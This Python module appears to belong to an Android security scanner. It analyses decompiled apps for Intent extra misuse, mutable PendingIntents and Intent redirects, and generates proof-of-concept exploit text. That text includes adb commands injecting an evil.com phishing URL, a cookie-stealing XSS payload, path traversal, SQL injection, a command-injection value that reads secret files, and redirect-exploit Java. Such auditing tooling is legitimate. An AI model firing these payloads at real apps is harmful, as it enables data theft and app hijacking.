"""
Intent Deep Analyzer - Analyzes Intent handling for security vulnerabilities.

Analyzes:
- Intent data extraction and usage
- PendingIntent creation vulnerabilities
- Intent redirect vulnerabilities
- Exported component handling
- Deep link parameter handling
"""

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from pathlib import Path


@dataclass
class IntentDataUsage:
    """Tracks how Intent data is used after extraction."""
    extra_name: str
    extra_type: str  # String, Int, Parcelable, etc.
    extraction_line: int
    variable_name: str
    usages: List['IntentUsage'] = field(default_factory=list)


@dataclass
class IntentUsage:
    """A specific usage of extracted Intent data."""
    usage_type: str  # "startActivity", "loadUrl", "sql_query", "file_path", etc.
    line_number: int
    code_snippet: str
    is_dangerous: bool = False
    danger_reason: str = ""


@dataclass
class PendingIntentVuln:
    """PendingIntent vulnerability."""
    creation_line: int
    type: str  # getActivity, getService, getBroadcast
    flags: List[str]
    base_intent_mutable: bool = False  # Is base intent empty/mutable?
    code_snippet: str = ""


@dataclass
class IntentRedirectVuln:
    """Intent redirect vulnerability."""
    extraction_line: int
    redirect_line: int
    redirect_method: str  # startActivity, startService, sendBroadcast
    source_extra: str  # The extra containing the Intent
    is_validated: bool = False
    code_path: List[str] = field(default_factory=list)


@dataclass
class IntentFinding:
    """Comprehensive Intent security finding."""
    file_path: str
    class_name: str
    is_exported: bool
    data_usages: List[IntentDataUsage]
    pending_intent_vulns: List[PendingIntentVuln]
    redirect_vulns: List[IntentRedirectVuln]
    deep_poc: str
    risk_score: int


class IntentAnalyzer:
    """
    Deep analyzer for Intent security issues.
    """

    def __init__(self, decompiled_path: str, manifest_data: Dict):
        self.decompiled_path = Path(decompiled_path)
        self.manifest = manifest_data
        self.package_name = manifest_data.get('package', '')

        # Parse exported components
        self.exported_components = self._parse_exported()

    def _parse_exported(self) -> Dict[str, Dict]:
        """Parse all exported components from manifest."""
        components = {}

        for comp_type in ['activities', 'services', 'receivers']:
            for comp in self.manifest.get(comp_type, []):
                name = comp.get('name', '')
                exported = comp.get('exported', False)
                has_intent_filter = bool(comp.get('intent_filters', []))

                if exported or has_intent_filter:
                    components[name] = {
                        'type': comp_type[:-1],  # Remove 's'
                        'exported': exported,
                        'intent_filters': comp.get('intent_filters', []),
                        'permission': comp.get('permission'),
                    }

        return components

    def analyze_file(self, file_path: str) -> Optional[IntentFinding]:
        """Analyze a single file for Intent security issues."""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                lines = content.split('\n')
        except:
            return None

        class_name = self._extract_class_name(content)
        package = self._extract_package(content)
        full_name = f"{package}.{class_name}"

        # Check if exported
        is_exported = full_name in self.exported_components

        # Find Intent data extraction
        data_usages = self._find_intent_data_usages(content, lines)

        # Find PendingIntent vulnerabilities
        pending_vulns = self._find_pending_intent_vulns(content, lines)

        # Find Intent redirect vulnerabilities
        redirect_vulns = self._find_redirect_vulns(content, lines)

        if not data_usages and not pending_vulns and not redirect_vulns:
            return None

        # Generate PoC
        poc = self._generate_poc(
            class_name, full_name, is_exported,
            data_usages, pending_vulns, redirect_vulns
        )

        return IntentFinding(
            file_path=file_path,
            class_name=class_name,
            is_exported=is_exported,
            data_usages=data_usages,
            pending_intent_vulns=pending_vulns,
            redirect_vulns=redirect_vulns,
            deep_poc=poc,
            risk_score=self._calculate_risk(data_usages, pending_vulns, redirect_vulns, is_exported),
        )

    def _find_intent_data_usages(self, content: str, lines: List[str]) -> List[IntentDataUsage]:
        """Find all Intent extra extractions and track their usage."""
        usages = []

        # Patterns for Intent extra extraction
        patterns = [
            # String url = getIntent().getStringExtra("url")
            (r'(\w+)\s*=\s*getIntent\(\)\s*\.\s*get(\w+)Extra\s*\(\s*["\']([^"\']+)["\']', 'direct'),
            # String url = intent.getStringExtra("url")
            (r'(\w+)\s*=\s*(\w+)\s*\.\s*get(\w+)Extra\s*\(\s*["\']([^"\']+)["\']', 'variable'),
            # getData().getQueryParameter("url")
            (r'(\w+)\s*=.*?getData\(\)\s*\.\s*getQueryParameter\s*\(\s*["\']([^"\']+)["\']', 'uri_param'),
        ]

        for pattern, ptype in patterns:
            for match in re.finditer(pattern, content):
                if ptype == 'direct':
                    var_name = match.group(1)
                    extra_type = match.group(2)
                    extra_name = match.group(3)
                elif ptype == 'variable':
                    var_name = match.group(1)
                    extra_type = match.group(3)
                    extra_name = match.group(4)
                else:  # uri_param
                    var_name = match.group(1)
                    extra_type = 'String'
                    extra_name = match.group(2)

                line_num = content[:match.start()].count('\n') + 1

                usage = IntentDataUsage(
                    extra_name=extra_name,
                    extra_type=extra_type,
                    extraction_line=line_num,
                    variable_name=var_name,
                )

                # Track how this variable is used
                usage.usages = self._track_variable_usage(content, var_name, line_num)

                # Only include if there are dangerous usages
                if any(u.is_dangerous for u in usage.usages):
                    usages.append(usage)

        return usages

    def _track_variable_usage(self, content: str, var_name: str,
                              start_line: int) -> List[IntentUsage]:
        """Track how a variable is used throughout the code."""
        usages = []

        # Dangerous usage patterns
        dangerous_patterns = [
            # WebView loading
            (rf'{var_name}\s*[^=]*\.\s*loadUrl\s*\(', 'loadUrl',
             'URL loaded into WebView - XSS/Phishing risk'),
            (rf'loadUrl\s*\(\s*{var_name}\s*\)', 'loadUrl',
             'URL loaded into WebView - XSS/Phishing risk'),

            # Activity/Service/Broadcast starting
            (rf'startActivity\s*\(\s*{var_name}\s*\)', 'startActivity',
             'Intent used to start activity - redirect possible'),
            (rf'startActivityForResult\s*\(\s*{var_name}', 'startActivityForResult',
             'Intent used for activity result - redirect possible'),
            (rf'startService\s*\(\s*{var_name}\s*\)', 'startService',
             'Intent used to start service'),
            (rf'sendBroadcast\s*\(\s*{var_name}', 'sendBroadcast',
             'Intent used to send broadcast'),

            # File operations
            (rf'new\s+File\s*\(\s*{var_name}', 'file_path',
             'Used as file path - path traversal risk'),
            (rf'openFileInput\s*\(\s*{var_name}', 'file_read',
             'Used to open file - path traversal risk'),
            (rf'openFileOutput\s*\(\s*{var_name}', 'file_write',
             'Used to write file - arbitrary file write'),

            # SQL queries
            (rf'rawQuery\s*\([^,]*{var_name}', 'sql_query',
             'Used in SQL query - SQL injection risk'),
            (rf'execSQL\s*\([^,]*{var_name}', 'sql_exec',
             'Used in SQL execution - SQL injection risk'),

            # Command execution
            (rf'Runtime.*exec\s*\([^)]*{var_name}', 'command_exec',
             'Used in command execution - command injection'),
            (rf'ProcessBuilder\s*\([^)]*{var_name}', 'process_builder',
             'Used in ProcessBuilder - command injection'),

            # Reflection
            (rf'Class\.forName\s*\(\s*{var_name}', 'reflection',
             'Used in reflection - arbitrary class loading'),

            # Intent setters (for redirect)
            (rf'setClassName\s*\([^)]*{var_name}', 'setClassName',
             'Used to set component - redirect to arbitrary activity'),
            (rf'setComponent\s*\([^)]*{var_name}', 'setComponent',
             'Used to set component - redirect to arbitrary activity'),
            (rf'setClass\s*\([^)]*{var_name}', 'setClass',
             'Used to set class - redirect to arbitrary activity'),
        ]

        for pattern, usage_type, danger_reason in dangerous_patterns:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_num = content[:match.start()].count('\n') + 1

                # Get code snippet
                line_start = content.rfind('\n', 0, match.start()) + 1
                line_end = content.find('\n', match.end())
                snippet = content[line_start:line_end].strip()

                usages.append(IntentUsage(
                    usage_type=usage_type,
                    line_number=line_num,
                    code_snippet=snippet,
                    is_dangerous=True,
                    danger_reason=danger_reason,
                ))

        return usages

    def _find_pending_intent_vulns(self, content: str, lines: List[str]) -> List[PendingIntentVuln]:
        """Find PendingIntent vulnerabilities."""
        vulns = []

        # Pattern for PendingIntent creation
        pattern = r'PendingIntent\s*\.\s*(getActivity|getService|getBroadcast|getForegroundService)\s*\([^)]+\)'

        for match in re.finditer(pattern, content):
            line_num = content[:match.start()].count('\n') + 1
            pi_type = match.group(1)

            # Get the full statement context (look back for Intent creation)
            context_start = max(0, match.start() - 500)
            context = content[context_start:match.end()]

            # Check if base Intent is empty/implicit
            is_mutable = False

            # Empty Intent pattern: new Intent()
            if re.search(r'new\s+Intent\s*\(\s*\)', context):
                is_mutable = True

            # Implicit Intent: no component set
            if not re.search(r'setComponent|setClass|setClassName|new\s+Intent\s*\([^)]*,\s*\w+\.class', context):
                # Could be implicit
                pass

            # Check flags
            flags = []
            flag_pattern = r'FLAG_(\w+)'
            flags = re.findall(flag_pattern, match.group(0))

            # Check for mutable flag (Android 12+ vulnerability)
            if 'MUTABLE' in flags or 'FLAG_MUTABLE' in content[match.start():match.start()+200]:
                is_mutable = True

            # Get code snippet
            line_start = content.rfind('\n', 0, match.start()) + 1
            line_end = content.find('\n', match.end())
            snippet = content[line_start:line_end].strip()

            if is_mutable:
                vulns.append(PendingIntentVuln(
                    creation_line=line_num,
                    type=pi_type,
                    flags=flags,
                    base_intent_mutable=True,
                    code_snippet=snippet,
                ))

        return vulns

    def _find_redirect_vulns(self, content: str, lines: List[str]) -> List[IntentRedirectVuln]:
        """Find Intent redirect vulnerabilities (passing Intent from extras to startActivity)."""
        vulns = []

        # Pattern: get Intent/Parcelable from extras, then use it to start activity
        # Step 1: Find Intent extraction from extras
        intent_extra_pattern = r'(\w+)\s*=.*?get(?:Parcelable)?Extra\s*\(\s*["\']([^"\']+)["\']\s*(?:,\s*Intent\.class)?\)'

        for match in re.finditer(intent_extra_pattern, content):
            var_name = match.group(1)
            extra_name = match.group(2)
            extract_line = content[:match.start()].count('\n') + 1

            # Check if this is cast to Intent
            context_after = content[match.end():match.end()+200]
            is_intent = 'Intent' in content[match.start()-50:match.end()+50]

            # Step 2: Check if this variable is used with startActivity/startService
            redirect_patterns = [
                (rf'startActivity\s*\(\s*{var_name}\s*\)', 'startActivity'),
                (rf'startActivityForResult\s*\(\s*{var_name}', 'startActivityForResult'),
                (rf'startService\s*\(\s*{var_name}\s*\)', 'startService'),
                (rf'sendBroadcast\s*\(\s*{var_name}', 'sendBroadcast'),
            ]

            for redirect_pattern, redirect_method in redirect_patterns:
                redirect_match = re.search(redirect_pattern, content)
                if redirect_match:
                    redirect_line = content[:redirect_match.start()].count('\n') + 1

                    # Check for validation between extraction and redirect
                    between = content[match.end():redirect_match.start()]
                    is_validated = self._check_intent_validation(between, var_name)

                    vulns.append(IntentRedirectVuln(
                        extraction_line=extract_line,
                        redirect_line=redirect_line,
                        redirect_method=redirect_method,
                        source_extra=extra_name,
                        is_validated=is_validated,
                    ))

        return vulns

    def _check_intent_validation(self, code: str, var_name: str) -> bool:
        """Check if Intent is validated before being used."""
        validation_patterns = [
            rf'{var_name}\s*\.\s*getComponent\s*\(\s*\)',
            rf'{var_name}\s*\.\s*getPackage\s*\(\s*\)',
            r'if\s*\([^)]*getComponent',
            r'if\s*\([^)]*getPackage',
            r'startsWith\s*\(',
            r'equals\s*\(',
        ]

        for pattern in validation_patterns:
            if re.search(pattern, code):
                return True
        return False

    def _extract_class_name(self, content: str) -> str:
        """Extract class name from source."""
        match = re.search(r'class\s+(\w+)', content)
        return match.group(1) if match else 'Unknown'

    def _extract_package(self, content: str) -> str:
        """Extract package from source."""
        match = re.search(r'package\s+([\w.]+)\s*;', content)
        return match.group(1) if match else ''

    def _generate_poc(self, class_name: str, full_name: str, is_exported: bool,
                      data_usages: List[IntentDataUsage],
                      pending_vulns: List[PendingIntentVuln],
                      redirect_vulns: List[IntentRedirectVuln]) -> str:
        """Generate comprehensive Intent exploitation PoC."""
        lines = []
        package = self.package_name

        lines.append("# " + "=" * 60)
        lines.append("# INTENT DEEP ANALYSIS - PROOF OF CONCEPT")
        lines.append("# " + "=" * 60)
        lines.append("")

        lines.append(f"# Target: {full_name}")
        lines.append(f"# Exported: {'YES ⚠️' if is_exported else 'NO'}")
        lines.append("")

        if not is_exported:
            lines.append("# NOTE: Component is not exported. Attack requires:")
            lines.append("#   - Another exported component that can forward Intents")
            lines.append("#   - Or an Intent redirect vulnerability elsewhere")
            lines.append("")

        # Data usage exploits
        if data_usages:
            lines.append("# " + "-" * 40)
            lines.append("# INTENT DATA INJECTION ATTACKS")
            lines.append("# " + "-" * 40)
            lines.append("")

            for usage in data_usages:
                lines.append(f"# Extra: '{usage.extra_name}' ({usage.extra_type})")
                lines.append(f"# Stored in variable: {usage.variable_name}")
                lines.append("")

                for u in usage.usages:
                    if u.is_dangerous:
                        lines.append(f"# DANGEROUS USAGE: {u.usage_type}")
                        lines.append(f"# Reason: {u.danger_reason}")
                        lines.append(f"# Line {u.line_number}: {u.code_snippet}")
                        lines.append("")

                        # Generate specific exploit
                        if u.usage_type == 'loadUrl':
                            lines.append("# === WebView URL Injection ===")
                            lines.append(f"adb shell am start -n {package}/{full_name} \\")
                            lines.append(f'    --es "{usage.extra_name}" "https://evil.com/phish.html"')
                            lines.append("")
                            lines.append("# XSS payload:")
                            lines.append(f"adb shell am start -n {package}/{full_name} \\")
                            lines.append(f'    --es "{usage.extra_name}" "javascript:alert(document.cookie)"')
                            lines.append("")

                        elif u.usage_type in ['file_path', 'file_read', 'file_write']:
                            lines.append("# === Path Traversal Attack ===")
                            lines.append(f"adb shell am start -n {package}/{full_name} \\")
                            lines.append(f'    --es "{usage.extra_name}" "../../../data/data/{package}/shared_prefs/prefs.xml"')
                            lines.append("")

                        elif u.usage_type in ['sql_query', 'sql_exec']:
                            lines.append("# === SQL Injection Attack ===")
                            lines.append(f"adb shell am start -n {package}/{full_name} \\")
                            lines.append(f'    --es "{usage.extra_name}" "\' OR 1=1--"')
                            lines.append("")

                        elif u.usage_type in ['command_exec', 'process_builder']:
                            lines.append("# === Command Injection Attack ===")
                            lines.append(f"adb shell am start -n {package}/{full_name} \\")
                            lines.append(f'    --es "{usage.extra_name}" "; cat /data/data/{package}/files/secret.txt"')
                            lines.append("")

        # PendingIntent exploits
        if pending_vulns:
            lines.append("# " + "-" * 40)
            lines.append("# PENDING INTENT VULNERABILITIES")
            lines.append("# " + "-" * 40)
            lines.append("")

            for vuln in pending_vulns:
                lines.append(f"# PendingIntent.{vuln.type}() at line {vuln.creation_line}")
                lines.append(f"# Base Intent Mutable: {'YES ⚠️' if vuln.base_intent_mutable else 'NO'}")
                lines.append(f"# Code: {vuln.code_snippet}")
                lines.append("")

                if vuln.base_intent_mutable:
                    lines.append("# === PendingIntent Hijacking ===")
                    lines.append("# Create malicious app that receives the PendingIntent")
                    lines.append("# Then fill in the empty base Intent to redirect to arbitrary component")
                    lines.append("")
                    lines.append("# Malicious receiver code:")
                    lines.append("# pendingIntent.send(context, 0, maliciousIntent);")
                    lines.append("")

        # Intent redirect exploits
        if redirect_vulns:
            lines.append("# " + "-" * 40)
            lines.append("# INTENT REDIRECT VULNERABILITIES")
            lines.append("# " + "-" * 40)
            lines.append("")

            for vuln in redirect_vulns:
                lines.append(f"# Extra '{vuln.source_extra}' redirected via {vuln.redirect_method}")
                lines.append(f"# Validated: {'YES' if vuln.is_validated else 'NO ⚠️'}")
                lines.append("")

                if not vuln.is_validated:
                    lines.append("# === Intent Redirect to Internal Component ===")
                    lines.append("# Access non-exported activities via redirect")
                    lines.append("")
                    lines.append("# Step 1: Create exploit app with malicious Intent")
                    lines.append("# Java code for exploit app:")
                    lines.append("# ```")
                    lines.append(f"# Intent outer = new Intent();")
                    lines.append(f"# outer.setComponent(new ComponentName(\"{package}\", \"{full_name}\"));")
                    lines.append(f"# ")
                    lines.append(f"# Intent inner = new Intent();")
                    lines.append(f"# inner.setComponent(new ComponentName(\"{package}\", \"{package}.InternalAdminActivity\"));")
                    lines.append(f"# outer.putExtra(\"{vuln.source_extra}\", inner);")
                    lines.append(f"# ")
                    lines.append(f"# startActivity(outer);")
                    lines.append("# ```")
                    lines.append("")
                    lines.append("# ADB equivalent (simpler but limited):")
                    lines.append(f"adb shell am start -n {package}/{full_name}")
                    lines.append("# Note: Full exploit requires custom app to pass Intent as extra")
                    lines.append("")

        return '\n'.join(lines)

    def _calculate_risk(self, data_usages: List[IntentDataUsage],
                        pending_vulns: List[PendingIntentVuln],
                        redirect_vulns: List[IntentRedirectVuln],
                        is_exported: bool) -> int:
        """Calculate risk score."""
        score = 0

        # Exported component base score
        if is_exported:
            score += 30

        # Data usage risks
        for usage in data_usages:
            dangerous_count = sum(1 for u in usage.usages if u.is_dangerous)
            score += dangerous_count * 15

        # PendingIntent risks
        for vuln in pending_vulns:
            if vuln.base_intent_mutable:
                score += 25

        # Redirect risks
        for vuln in redirect_vulns:
            if not vuln.is_validated:
                score += 30

        return min(score, 100)
